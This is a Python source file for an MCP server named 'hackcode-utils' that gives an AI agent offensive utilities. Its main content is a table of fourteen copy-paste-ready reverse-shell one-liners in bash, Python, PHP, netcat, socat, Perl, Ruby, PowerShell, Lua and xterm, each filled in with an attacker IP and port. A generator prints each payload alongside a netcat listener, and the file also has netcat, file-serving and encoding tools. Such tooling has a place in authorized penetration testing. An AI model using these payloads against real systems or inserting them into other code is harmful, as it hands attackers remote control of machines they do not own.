"""MCP Server: Utility tools for HackCode (reverse shells, encoding, netcat, etc.)."""

import base64
import urllib.parse
from mcp.server import Server
from mcp.server.stdio import stdio_server
from mcp.types import Tool, TextContent
from .base import run_tool, format_result, check_tool


app = Server("hackcode-utils")

REVERSE_SHELLS = {
    "bash": 'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
    "bash-udp": 'bash -i >& /dev/udp/{ip}/{port} 0>&1',
    "python": '''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' ''',
    "python-short": '''python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")' ''',
    "php": '''php -r '$sock=fsockopen("{ip}",{port});exec("bash <&3 >&3 2>&3");' ''',
    "nc": 'nc -e /bin/bash {ip} {port}',
    "nc-mkfifo": 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {ip} {port} >/tmp/f',
    "nc-c": 'nc -c bash {ip} {port}',
    "socat": 'socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:{ip}:{port}',
    "perl": '''perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");}};' ''',
    "ruby": '''ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("bash -i <&%d >&%d 2>&%d",f,f,f)' ''',
    "powershell": '''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s = $client.GetStream();[byte[]]$b = 0..65535|%{{0}};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sendbyte,0,$sendbyte.Length);$s.Flush()}};$client.Close()"''',
    "lua": '''lua -e "require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('bash -i <&3 >&3 2>&3');"''',
    "xterm": 'xterm -display {ip}:1',
}


@app.list_tools()
async def list_tools() -> list[Tool]:
    return [
        Tool(
            name="reverse_shell_gen",
            description="Generate reverse shell one-liners in various languages. Produces copy-paste ready payloads.",
            inputSchema={
                "type": "object",
                "properties": {
                    "ip": {"type": "string", "description": "Attacker IP address (LHOST)"},
                    "port": {"type": "integer", "description": "Attacker port (LPORT)"},
                    "language": {"type": "string", "description": "Shell language", "enum": list(REVERSE_SHELLS.keys()), "default": "bash"},
                    "all": {"type": "boolean", "description": "Show all reverse shell types", "default": False},
                },
                "required": ["ip", "port"],
            },
        ),
        Tool(
            name="encode_decode",
            description="Encode/decode data in various formats: base64, hex, URL, ROT13, binary, HTML entities.",
            inputSchema={
                "type": "object",
                "properties": {
                    "input": {"type": "string", "description": "Input string to encode/decode"},
                    "method": {"type": "string", "description": "Encoding method", "enum": ["base64_encode", "base64_decode", "hex_encode", "hex_decode", "url_encode", "url_decode", "rot13"]},
                },
                "required": ["input", "method"],
            },
        ),
        Tool(
            name="nc",
            description="Netcat - TCP/UDP connections, listeners, port scanning, file transfer.",
            inputSchema={
                "type": "object",
                "properties": {
                    "target": {"type": "string", "description": "Target host (omit for listener mode)"},
                    "port": {"type": "integer", "description": "Port number"},
                    "listen": {"type": "boolean", "description": "Listen mode (-l)", "default": False},
                    "flags": {"type": "string", "description": "Additional flags (e.g., '-v' verbose, '-z' scan, '-u' UDP)"},
                },
                "required": ["port"],
            },
        ),
        Tool(
            name="python_http_server",
            description="Start a quick Python HTTP server for file transfer during engagements.",
            inputSchema={
                "type": "object",
                "properties": {
                    "port": {"type": "integer", "description": "Port to serve on", "default": 8000},
                    "directory": {"type": "string", "description": "Directory to serve", "default": "."},
                },
            },
        ),
        Tool(
            name="ip_info",
            description="IP geolocation and ASN lookup using curl to ip-api.com.",
            inputSchema={
                "type": "object",
                "properties": {
                    "ip": {"type": "string", "description": "IP address to look up"},
                },
                "required": ["ip"],
            },
        ),
    ]


@app.call_tool()
async def call_tool(name: str, arguments: dict) -> list[TextContent]:
    if name == "reverse_shell_gen":
        ip = arguments["ip"]
        port = arguments["port"]

        if arguments.get("all", False):
            lines = ["# Reverse Shell One-Liners", f"# LHOST={ip} LPORT={port}", ""]
            for lang, template in REVERSE_SHELLS.items():
                shell = template.format(ip=ip, port=port)
                lines.append(f"## {lang}")
                lines.append(f"```")
                lines.append(shell)
                lines.append(f"```")
                lines.append("")
            return [TextContent(type="text", text="\n".join(lines))]

        lang = arguments.get("language", "bash")
        template = REVERSE_SHELLS.get(lang)
        if not template:
            return [TextContent(type="text", text=f"Unknown language: {lang}. Available: {', '.join(REVERSE_SHELLS.keys())}")]

        shell = template.format(ip=ip, port=port)
        # Also generate the listener command
        listener = f"nc -lvnp {port}"

        result = [
            f"# {lang} Reverse Shell",
            f"# Target runs:",
            f"```",
            shell,
            f"```",
            f"",
            f"# Attacker listener:",
            f"```",
            listener,
            f"```",
        ]
        return [TextContent(type="text", text="\n".join(result))]

    elif name == "encode_decode":
        input_str = arguments["input"]
        method = arguments["method"]

        try:
            if method == "base64_encode":
                output = base64.b64encode(input_str.encode()).decode()
            elif method == "base64_decode":
                output = base64.b64decode(input_str).decode()
            elif method == "hex_encode":
                output = input_str.encode().hex()
            elif method == "hex_decode":
                output = bytes.fromhex(input_str).decode()
            elif method == "url_encode":
                output = urllib.parse.quote(input_str)
            elif method == "url_decode":
                output = urllib.parse.unquote(input_str)
            elif method == "rot13":
                output = input_str.translate(str.maketrans(
                    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
                    'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'
                ))
            else:
                output = f"Unknown method: {method}"

            return [TextContent(type="text", text=f"Input: {input_str}\nMethod: {method}\nOutput: {output}")]
        except Exception as e:
            return [TextContent(type="text", text=f"Error: {str(e)}")]

    elif name == "nc":
        binary = "ncat" if check_tool("ncat") == "" else "nc"
        err = check_tool(binary, "ncat")
        if err:
            return [TextContent(type="text", text=err)]
        cmd = [binary]
        if arguments.get("listen"):
            cmd.extend(["-l", "-v", "-n", "-p", str(arguments["port"])])
        else:
            if arguments.get("flags"):
                cmd.extend(arguments["flags"].split())
            cmd.extend([arguments.get("target", ""), str(arguments["port"])])
        result = run_tool(cmd, timeout=10)
        return [TextContent(type="text", text=format_result(result))]

    elif name == "python_http_server":
        port = arguments.get("port", 8000)
        directory = arguments.get("directory", ".")
        return [TextContent(type="text", text=f"Run this command to start an HTTP server:\n\npython3 -m http.server {port} -d {directory}\n\nFiles will be served at http://0.0.0.0:{port}/")]

    elif name == "ip_info":
        result = run_tool(["curl", "-s", f"http://ip-api.com/json/{arguments['ip']}"], timeout=10)
        return [TextContent(type="text", text=format_result(result))]

    else:
        return [TextContent(type="text", text=f"Unknown tool: {name}")]


async def main():
    async with stdio_server() as (read_stream, write_stream):
        await app.run(read_stream, write_stream)


if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
